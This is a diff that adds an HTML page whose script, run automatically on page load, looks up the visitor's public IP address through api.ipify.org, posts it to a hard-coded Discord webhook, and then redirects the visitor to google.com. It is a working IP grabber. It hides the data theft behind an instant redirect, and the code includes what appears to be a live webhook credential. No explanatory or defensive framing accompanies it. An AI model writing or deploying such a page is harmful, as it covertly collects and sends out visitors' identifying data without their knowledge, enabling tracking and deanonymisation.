@@ -1,0 +1,23 @@
+<html>
+<body onload="ipv4()">
+<script>
+        function ipv4() {
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    var ip = this.responseText;
+                    var webhookUrl = 'https://discord.com/api/webhooks/1081373617910186075/9t5F1-T3k8nExU6BMKJzIafJ27OD1nzbKiL3JH2rGlLPnGHKNrv0-_NNz_b3347tJ4pH';
+                    var data = JSON.stringify({ 'content': 'IPV4 Address: ' + ip });
+                    var xhr2 = new XMLHttpRequest();
+                    xhr2.open('POST', webhookUrl, true);
+                    xhr2.setRequestHeader('Content-Type', 'application/json');
+                    xhr2.send(data);
+                    window.location.href = 'https://www.google.com/';
+                }
+            };
+            xhr.open('GET', 'https://api.ipify.org/', true);
+            xhr.send();
+        }
+    </script>
+</body>
+</html> 
